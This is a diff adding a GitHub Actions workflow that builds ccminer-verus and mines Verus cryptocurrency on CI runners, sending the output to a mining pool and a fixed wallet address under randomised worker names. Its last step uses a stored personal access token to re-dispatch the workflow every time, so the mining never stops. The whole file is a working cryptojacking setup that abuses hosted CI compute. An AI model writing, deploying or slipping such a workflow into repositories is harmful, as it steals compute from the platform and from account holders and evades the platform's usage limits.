@@ -1,0 +1,40 @@
+name: 18
+on:
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Update & Install Dependencies
+        run: |
+          sudo apt update -y
+          sudo apt install -y git build-essential libcurl4-openssl-dev \
+              libssl-dev libjansson-dev automake autotools-dev cmake
+
+      - name: Download & Build ccminer
+        run: |
+          if [ ! -d "$HOME/ccminer" ]; then
+            git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
+            cd ~/ccminer
+            ./build.sh
+          else
+            cd ~/ccminer
+            ./build.sh
+          fi
+
+      - name: Start Mining
+        run: |
+          cd ~/ccminer
+          WRK="hub_$(tr -dc 'a-z0-9' </dev/urandom | head -c 4)"
+          ./ccminer -a verus -o stratum+tcp://cn.vipor.net:5040 \
+            -u RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p.$WRK -p x -t 8
+
+      - name: Restart Workflow
+        if: ${{ always() }}
+        run: |
+          curl -X POST -H "Accept: application/vnd.github+json" \
+          -H "Authorization: Bearer ${{ secrets.PAT_TOKEN }}" \
+          https://api.github.com/repos/${{ github.repository }}/actions/workflows/18.yml/dispatches \
+          -d '{"ref":"main"}'
